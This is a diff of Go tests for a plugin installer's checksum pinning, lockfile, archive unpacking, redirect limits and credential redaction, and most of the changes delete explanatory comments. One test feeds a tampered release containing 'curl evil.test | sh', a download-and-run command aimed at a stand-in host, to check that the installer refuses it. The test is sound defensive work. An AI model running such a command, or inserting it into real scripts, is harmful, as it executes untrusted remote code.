@@ -18,8 +18,6 @@ import (
 
 const stubBinary = "#!/bin/sh\necho lore-linear\n"
 
-// scene is one plugin published on a faked GitHub, with a cache rooted in a
-// temporary directory: no test writes to a real home or reaches the network.
 type scene struct {
 	fake      *plugindisttest.GitHub
 	store     *Store
@@ -104,8 +102,6 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 		t.Fatalf("locked url = %q", artifact.URL)
 	}
 
-	// The layout is load-bearing: versions live in separate directories so
-	// several may coexist, and the lockfile decides which one runs.
 	want := filepath.Join(scene.store.root, "plugins", "linear", "v0.3.1", scene.coord.binaryName(scene.store.platform))
 	if result.Binary != want {
 		t.Fatalf("binary = %q, want %q", result.Binary, want)
@@ -126,8 +122,6 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 	}
 }
 
-// A mutated release asset is the attack the checksums file exists to catch on a
-// first install, and nothing is written when it does.
 func TestInstallRefusesATamperedArtifact(t *testing.T) {
 	t.Parallel()
 
@@ -150,15 +144,12 @@ func TestInstallRefusesATamperedArtifact(t *testing.T) {
 	}
 }
 
-// The locked digest is the pin, and it wins over anything the publisher serves
-// afterwards: no flag makes this continue.
 func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
 	lock, first := scene.installed(t)
 
-	// The publisher rewrites the release: new bytes, new checksums, same tag.
 	rewritten := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("curl evil.test | sh\n"))
 	scene.fake.Publish("v0.3.1", map[string][]byte{scene.asset: rewritten})
 
@@ -181,8 +172,6 @@ func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
 	}
 }
 
-// Update is the one command allowed to replace a locked digest, and install
-// says so rather than silently doing nothing about a version it cannot reach.
 func TestInstallRefusesAVersionTheLockDisagreesWith(t *testing.T) {
 	t.Parallel()
 
@@ -233,14 +222,11 @@ func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
 		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
 	}
 
-	// Both versions coexist on disk; the lockfile is what decides which runs.
 	if _, err := os.Stat(cacheDir(t, scene.store, "linear", "v0.3.1")); err != nil {
 		t.Fatalf("v0.3.1 was removed by an update: %v", err)
 	}
 }
 
-// The failure has to name both sides: the publisher fixes their pipeline, and
-// the reader cannot see the difference without the two lists.
 func TestInstallMissingAssetNamesWhatWasLookedForAndWhatExists(t *testing.T) {
 	t.Parallel()
 
@@ -284,8 +270,6 @@ func TestInstallRefusesAnEmptyChecksumsList(t *testing.T) {
 	}
 }
 
-// An unresolvable coordinate aborts the install and writes nothing: the
-// lockfile that is committed to the repository is left exactly as it was.
 func TestInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
 	t.Parallel()
 
@@ -311,8 +295,6 @@ func TestInstallUnresolvableCoordinateWritesNoLock(t *testing.T) {
 	}
 }
 
-// @latest is resolved once, by install, and what it resolved to is what the
-// caller writes back into lore.yaml.
 func TestInstallPinsLatestToAConcreteVersion(t *testing.T) {
 	t.Parallel()
 
@@ -333,15 +315,11 @@ func TestInstallPinsLatestToAConcreteVersion(t *testing.T) {
 		t.Fatalf("pinned = %+v, want v0.3.1", pinned)
 	}
 
-	// A floating coordinate must never reach the installer, so the guard is
-	// checked rather than assumed.
 	if _, err := scene.installer.Install(context.Background(), Request{Coordinate: floating}, &Lock{}); err == nil {
 		t.Fatal("installing a floating coordinate succeeded")
 	}
 }
 
-// A locally-sourced plugin has no lock entry by construction. That is the whole
-// cost of the escape hatch, and the warning says so.
 func TestInstallLocalCoordinateIsNeverLocked(t *testing.T) {
 	t.Parallel()
 
@@ -373,8 +351,6 @@ func TestInstallLocalCoordinateIsNeverLocked(t *testing.T) {
 	}
 }
 
-// A URL coordinate has no checksums file to read a digest out of, so the first
-// fetch is what gets pinned — and the second fetch is checked against it.
 func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
 	t.Parallel()
 
@@ -420,7 +396,6 @@ func TestUnpackSkipsArchiveEntriesThatAreNotOneFileName(t *testing.T) {
 		t.Fatalf("entries = %v, want LICENSE alone", got)
 	}
 
-	// The skipped entry was the only executable, so the fallback picks nothing.
 	_, _, err = unpack(scene.coord, scene.store.platform, scene.asset, archive)
 	if err == nil {
 		t.Fatal("unpacking an archive whose only executable escapes the cache succeeded, want a refusal")
@@ -430,8 +405,6 @@ func TestUnpackSkipsArchiveEntriesThatAreNotOneFileName(t *testing.T) {
 	}
 }
 
-// goreleaser archives nest the binary under a directory, and that prefix is
-// stripped rather than refused.
 func TestUnpackTakesTheBinaryFromUnderADirectoryPrefix(t *testing.T) {
 	t.Parallel()
 
@@ -455,9 +428,6 @@ func TestUnpackTakesTheBinaryFromUnderADirectoryPrefix(t *testing.T) {
 	}
 }
 
-// The fallback takes a binary the publisher named something else, and stops at
-// one: an archive that smuggles a second executable is refused rather than
-// resolved into whichever of the two the reader did not mean.
 func TestUnpackFallsBackToTheArchivesOnlyExecutable(t *testing.T) {
 	t.Parallel()
 
@@ -493,8 +463,6 @@ func TestUnpackFallsBackToTheArchivesOnlyExecutable(t *testing.T) {
 	}
 }
 
-// Private distribution often serves the binary itself, so an artifact that is
-// not an archive is the binary rather than a failed unpack.
 func TestInstallOfABareBinaryURLTakesTheArtifactAsTheBinary(t *testing.T) {
 	t.Parallel()
 
@@ -511,7 +479,6 @@ func TestInstallOfABareBinaryURLTakesTheArtifactAsTheBinary(t *testing.T) {
 	}
 }
 
-// .tgz is the other name the goreleaser convention publishes a tarball under.
 func TestInstallOfATgzURLUnpacksTheArchive(t *testing.T) {
 	t.Parallel()
 
@@ -590,8 +557,7 @@ func TestBoundedGetRefusesARedirectOffHTTPS(t *testing.T) {
 	}
 }
 
-// A release asset URL redirects to a CDN, so refusing redirects outright would
-// break every real install.
+// A release asset URL redirects to a CDN, so refusing redirects outright breaks every real install.
 func TestBoundedGetFollowsAnHTTPSRedirect(t *testing.T) {
 	t.Parallel()
 
@@ -615,8 +581,7 @@ func TestBoundedGetFollowsAnHTTPSRedirect(t *testing.T) {
 	}
 }
 
-// Installing the redirect policy replaces the default one, and the default is
-// what capped a chain, so an https loop must still be stopped by hop count.
+// A custom CheckRedirect replaces net/http's default 10-hop cap, so the policy bounds the chain itself.
 func TestBoundedGetStopsAnHTTPSRedirectLoop(t *testing.T) {
 	t.Parallel()
 
@@ -710,8 +675,6 @@ func TestBoundedGetClassifiesTheResponse(t *testing.T) {
 	}
 }
 
-// A private artifact is fetched from the operator's own from: string,
-// credentials and all, and every refusal about it reaches a terminal and a log.
 const (
 	fakeUser  = "svcaccount"
 	fakeToken = "fake-not-a-real-token"
@@ -834,8 +797,6 @@ func TestInstallRefusalDoesNotEchoAURLCoordinatesCredentials(t *testing.T) {
 	assertRedacted(t, err, target)
 }
 
-// A release's browser_download_url is the publisher's, not the operator's, and
-// a GHE or S3-backed one carries its credential in the query.
 func TestChecksumsRefusalDoesNotEchoURLCredentials(t *testing.T) {
 	t.Parallel()
 
@@ -853,9 +814,6 @@ func TestChecksumsRefusalDoesNotEchoURLCredentials(t *testing.T) {
 	assertRedacted(t, err, published)
 }
 
-// A URL coordinate reads its version out of the URL's last segment, so a
-// legitimate version is filename-shaped rather than semver, and the cache has
-// to keep taking it.
 func TestInstallOfAURLDerivedVersionCachesItUnderThatVersion(t *testing.T) {
 	t.Parallel()
 
